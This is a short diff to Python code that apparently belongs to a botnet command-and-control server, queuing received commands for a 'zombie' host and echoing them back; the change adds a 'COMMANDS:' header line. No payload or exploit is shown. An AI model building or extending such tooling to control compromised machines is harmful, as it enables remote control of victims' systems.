@@ -26,6 +26,7 @@ def execute_command(socket):
 	command = socket.recv(2048).decode('utf-8')
 	z.command_cue.append(command)
 	socket.send(('The following commands are cued for zombie '+z.uuid+'\n').encode())
+	socket.send('COMMANDS:\n'.encode())
 	for command in z.command_cue:
 		socket.send((command).encode())
 
